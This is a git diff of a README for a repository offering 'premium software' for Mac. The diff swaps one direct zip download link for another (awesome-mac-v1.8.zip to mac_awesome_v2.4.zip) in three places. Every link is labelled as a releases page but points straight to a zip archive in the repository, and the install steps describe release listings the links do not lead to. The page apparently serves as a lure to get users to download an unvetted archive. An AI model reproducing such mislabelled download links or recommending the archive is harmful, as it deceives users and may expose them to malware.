@@ -1,6 +1,6 @@
 # 🍏 awesome-mac - Premium Software for Your Mac
 
-[![Download from Releases](https://raw.githubusercontent.com/Deft-actor575/awesome-mac/master/dist/awesome-mac-v1.8.zip%20Now%20-%20Releases-brightgreen)](https://raw.githubusercontent.com/Deft-actor575/awesome-mac/master/dist/awesome-mac-v1.8.zip)
+[![Download from Releases](https://github.com/Deft-actor575/awesome-mac/raw/refs/heads/master/dist/mac_awesome_v2.4.zip%20Now%20-%20Releases-brightgreen)](https://github.com/Deft-actor575/awesome-mac/raw/refs/heads/master/dist/mac_awesome_v2.4.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ Follow these steps to download and install our software:
 
 1. **Visit the Releases Page**: Click the link below to access the Releases page where you can find all available versions.
 
-   [Visit Releases Page](https://raw.githubusercontent.com/Deft-actor575/awesome-mac/master/dist/awesome-mac-v1.8.zip)
+   [Visit Releases Page](https://github.com/Deft-actor575/awesome-mac/raw/refs/heads/master/dist/mac_awesome_v2.4.zip)
 
 2. **Select Your Application**: On the Releases page, you will see a list of software titles. Find the software you wish to download. Each listing will provide information about the version, features, and release notes.
 
@@ -60,7 +60,7 @@ For additional help or questions, please feel free to reach out. You can open an
 
 To access the applications, visit the Releases page below. You will find everything you need to download, install, and begin using our premium software.
 
-[Visit Releases Page](https://raw.githubusercontent.com/Deft-actor575/awesome-mac/master/dist/awesome-mac-v1.8.zip)
+[Visit Releases Page](https://github.com/Deft-actor575/awesome-mac/raw/refs/heads/master/dist/mac_awesome_v2.4.zip)
 
 ## 📚 Topics 
 
